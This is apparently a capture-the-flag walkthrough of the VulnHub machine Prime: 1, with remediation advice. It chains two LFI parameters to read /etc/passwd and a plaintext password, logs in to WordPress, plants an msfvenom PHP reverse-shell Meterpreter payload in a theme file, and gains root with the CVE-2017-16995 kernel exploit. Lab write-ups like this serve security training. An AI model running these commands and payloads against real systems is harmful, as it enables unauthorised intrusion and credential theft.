# Prime: 1 — Follow the Clues, Find the Root

Alright dudes!! Prime: 1 is a seriously slept on machine for learning LFI chaining. The whole path is hint-driven: a secret.txt points you to a parameter name, that parameter reads internal files, one file leaks credentials, those credentials get you into WordPress, and a writable theme file becomes your shell. Kernel exploit finishes it. Every step is a breadcrumb that teaches you to read the environment rather than hammer it blindly. Legit great design, no cap.

Shoutout to Sunil Chouhan for building a machine where each clue feels earned. This is exactly the kind of environment that builds the "read before you run" habit.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Prime: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/prime-1,358/ |
| **Techniques** | Web directory enumeration, LFI chaining (two separate parameters), credential extraction from user home directory, WordPress admin login, writable theme PHP injection, Metasploit PHP Meterpreter, kernel exploit (BPF sign-extension) |
| **CVEs** | CVE-2017-16995 (Linux kernel BPF sign-extension privilege escalation) |
| **APT Groups** | Lazarus Group (targets WordPress and CMS installations for initial access in financial and creative sectors); APT28 (uses LFI and credential harvesting for lateral movement in web infrastructure) |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → dirb → /WordPress, /dev/, secret.txt
  → curl secret.txt → hint: "file" parameter on index.php
  → http://target/index.php?file=location.txt → reveals secrettier360 parameter on /image.php
  → http://target/image.php?secrettier360=/etc/passwd → user: saket
  → http://target/image.php?secrettier360=/home/saket/password.txt → follow_the_ippsec
  → http://target/WordPress/wp-login.php → victor:follow_the_ippsec
  → Appearance > Theme Editor > secret.php → writable
  → msfvenom PHP meterpreter → paste into secret.php → save
  → Metasploit multi/handler → curl trigger URL → Meterpreter session
  → cat /home/saket/user.txt
  → uname -a → kernel 4.10.0-28 → CVE-2017-16995
  → use exploit/linux/local/bpf_sign_extension_priv_esc → session 2 root
  → cat /root/root.txt
```

---

## Methodology

1. Full port scan: identify SSH (22) and HTTP (80)
2. Directory enumeration with dirb: find WordPress, /dev/, secret.txt
3. LFI #1: index.php?file= parameter disclosed via secret.txt hint
4. LFI #2: image.php?secrettier360= parameter disclosed via location.txt
5. Read /etc/passwd and /home/saket/password.txt via LFI #2
6. WordPress login as victor with extracted password
7. Locate writable theme file (secret.php)
8. PHP Meterpreter payload injection via theme editor
9. User flag capture
10. Kernel version check: vulnerable to CVE-2017-16995
11. Metasploit BPF exploit for root
12. Root flag capture

---

## Step 1 — Network Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -A 192.168.1.101
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: SSH and HTTP. Web enumeration comes first.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration with dirb

```bash
dirb http://192.168.1.101
```

Key findings:

```
http://192.168.1.101/WordPress/     [WordPress installation]
http://192.168.1.101/dev/           [directory listing]
http://192.168.1.101/secret.txt     [plain text file]
```

Read `secret.txt`:

```bash
curl http://192.168.1.101/secret.txt
```

Content: a hint referencing a GitHub link and the word **"file"** as a parameter name. The hint is telling you to try `?file=` on `index.php`.

Also: run with text extension search:

```bash
dirb http://192.168.1.101/ -X .txt
# Finds: secret.txt, /dev/ contents
```

Check WordPress for usernames:

```bash
wpscan --url http://192.168.1.101/WordPress/ --enumerate u
# Username discovered: victor (visible in post author metadata)
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — LFI #1: index.php?file= Parameter

The hint from `secret.txt` says to try the `file` parameter on `index.php`:

```
http://192.168.1.101/index.php?file=location.txt
```

Response includes the contents of `location.txt`:

```
I know you are looking for the key but it's not here.
Try secrettier360 parameter on /image.php
```

Perfect breadcrumb. Two things confirmed: LFI exists on `index.php`, and the next step uses a different parameter on a different page.

**Real-world note:** LFI vulnerabilities in PHP applications allow an attacker to include files from the server's filesystem in the HTTP response. Even files outside the web root can be read. This is CWE-22 (Path Traversal) and CWE-98 (Improper Control of Filename for Include). These vulnerabilities are consistently found in custom PHP applications and poorly configured CMS themes. APT28 uses LFI as a stepping stone to credential extraction.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 4 — LFI #2: image.php?secrettier360= Parameter

```bash
# Confirm LFI on image.php
curl "http://192.168.1.101/image.php?secrettier360=/etc/passwd"
```

`/etc/passwd` is returned. Notable user: **saket** with home directory at `/home/saket`.

Now read saket's password file directly:

```bash
curl "http://192.168.1.101/image.php?secrettier360=/home/saket/password.txt"
```

```
follow_the_ippsec
```

Credentials extracted: `victor` / `follow_the_ippsec` (the username from WordPress, the password from saket's home directory via LFI).

**Real-world note:** Storing plaintext passwords in files inside user home directories is an obvious security failure, but it appears regularly in environments with poor credential management practices. The combination of LFI exposing `/home/user/password.txt` is a textbook case that appears in real web application penetration tests.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

---

## Step 5 — WordPress Login as victor

```
URL: http://192.168.1.101/WordPress/wp-login.php
Username: victor
Password: follow_the_ippsec
```

Login successful. Admin dashboard accessible.

Enumerate available attack surfaces in WordPress admin:

- Plugin upload: attempt upload of `.php` disguised as plugin — likely fails if directory not writable
- Theme editor: **Appearance > Theme Editor**

Navigate to **Appearance > Theme Editor > Select Theme: twentynineteen > secret.php**

The file `secret.php` is writable (verified by the save function not returning an error on test edit).

**MITRE ATT&CK:** T1078 — Valid Accounts; T1505.004 — Server Software Component: IIS Components (analogous WordPress theme)

---

## Step 6 — PHP Meterpreter Payload via Writable Theme File

Generate a PHP Meterpreter payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.106 \
    LPORT=4444 \
    -f raw > /tmp/shell_payload.php
```

Copy the generated PHP code from `/tmp/shell_payload.php`. In the WordPress theme editor, paste the entire payload into `secret.php` and click **Update File**.

Start the Metasploit handler:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.106
set LPORT 4444
exploit
```

Trigger the shell by browsing to:

```
http://192.168.1.101/WordPress/wp-content/themes/twentynineteen/secret.php
```

Meterpreter session opens as `www-data`.

```bash
# In Meterpreter
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /home/saket/user.txt
```

**Alternative:** Use a simple PHP web shell instead of Meterpreter if you prefer a lightweight approach, then upgrade with a bash reverse shell.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 7 — Privilege Escalation: Kernel Exploit (CVE-2017-16995)

Check the kernel version:

```bash
uname -a
# Linux prime 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Aug 3 10:01:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel 4.10.0-28 on Ubuntu 16.04 is vulnerable to **CVE-2017-16995** — BPF (Berkeley Packet Filter) sign-extension privilege escalation. Metasploit has a module for this:

```bash
# In Metasploit (background the meterpreter session first)
background  # or Ctrl+Z

use exploit/linux/local/bpf_sign_extension_priv_esc
set session 1
set LHOST 192.168.1.106
exploit
```

Session 2 opens as root.

```bash
# In session 2
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. The prime number of this machine is 0 (root).

**Real-world note:** Unpatched Linux kernels remain one of the most reliable privilege escalation paths. Ubuntu 16.04 reached end-of-life in April 2021, meaning all remaining installations carry multiple unpatched kernel CVEs. CVE-2017-16995 specifically affects the eBPF verifier and is exploitable on 4.4.0 through 4.14.x kernels. Lazarus Group and APT28 both use local kernel exploits as a fallback escalation path when other methods fail.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation; T1548 — Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| WordPress Username | victor | Post author metadata via wpscan | WordPress login |
| Password | follow_the_ippsec | /home/saket/password.txt via LFI | WordPress admin login |
| Meterpreter Session | www-data | Writable theme file (secret.php) | Shell access |
| User Flag | user.txt | /home/saket/user.txt | Captured via Meterpreter shell |
| Root Flag | root.txt | /root/root.txt | Captured after kernel exploit |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | LFI chained across two endpoints: hint-driven parameter discovery | LFI in PHP apps with multiple entry points allows full credential extraction when parameter names are guessed or hinted | Validate and whitelist all file inclusion parameters; avoid user-controlled file paths entirely |
| 2 | Plaintext password in /home/saket/password.txt | Credential files in home directories are exposed by any LFI, SSRF, or XXE vulnerability | Never store credentials in plaintext files; use a secrets manager or vault |
| 3 | WordPress theme file writable by www-data: code execution | Any writable PHP file in the web root is a code execution vector accessible via the application | Set strict permissions on WordPress theme and plugin directories; use read-only mounts |
| 4 | Unpatched kernel 4.10.0-28: CVE-2017-16995 | End-of-life OS versions carry multiple unpatched kernel CVEs | Apply security updates; monitor kernel CVE feeds; migrate off EOL operating systems |
| 5 | Hint-driven attack path (secret.txt → location.txt → parameter name) | Real applications sometimes leave comments, hints, or debug files in production | Remove all debug/hint/dev files before deployment; automate detection in CI/CD pipeline |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix LFI in index.php and image.php** — validate and whitelist the `file` and `secrettier360` parameters; use a mapping of allowed files rather than direct path inclusion
2. **Remove /home/saket/password.txt** — never store credentials in plaintext; use a secrets manager
3. **Set correct permissions on WordPress theme directories** — `chmod -R 755 wp-content/themes/`; no write permission for www-data
4. **Remove secret.txt, location.txt, dev directory** — no debug or hint files in production web root
5. **Apply kernel updates** — upgrade from Ubuntu 16.04 (EOL); patch to current LTS; enable automatic security updates
6. **Enforce strong WordPress user passwords** — `follow_the_ippsec` is a real word phrase; use a password generator

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all PHP applications with file inclusion functionality |
| Protect | Access Control | Fix LFI; set strict web directory permissions |
| Protect | Data Security | No plaintext credentials in files; secrets manager |
| Detect | Anomalies and Events | Alert on LFI attempts (path traversal patterns in web logs) |
| Respond | Response Planning | Remove webshells from theme directory; rotate credentials |
| Recover | Recovery Planning | Upgrade OS; patch kernel; restore from clean backup |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict web directory write permissions |
| AC-6 | Least Privilege | www-data should not write to theme directories |
| IA-5 | Authenticator Management | No plaintext passwords in files; enforce strong passwords |
| CM-6 | Configuration Settings | Disable directory listing; remove debug files |
| SI-2 | Flaw Remediation | Patch kernel; upgrade from EOL OS |
| SI-10 | Information Input Validation | Validate all file inclusion parameters |

### CISA KEV

CVE-2017-16995 (Linux kernel BPF privilege escalation) is catalogued in CISA's Known Exploited Vulnerabilities catalog. Systems running affected kernel versions should be patched or isolated immediately per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL3 |
| Identity and Access Management (IAM) | Manage Credentials | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (input validation for LFI; web directory permissions)
- **D3-OAM** — Operating System Administrative Management (kernel patching; EOL OS migration)
- **D3-HBPI** — Harden Build Pipeline Integrity (remove debug files in deployment; automate credential scanning)

---

## Final Thoughts

Prime: 1 teaches one of the most important habits in web penetration testing: read the environment before you run tools. Every step in this machine gave you exactly what you needed to proceed, if you read carefully enough. `secret.txt` told you the parameter. `location.txt` told you the next parameter. LFI told you the password. The password got you into WordPress. The theme editor got you the shell. The kernel version got you root.

That systematic, clue-following approach is exactly how experienced penetration testers move through an engagement. Brute-force gets you nowhere here. Observation does.

GG dude, follow the ippsec. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
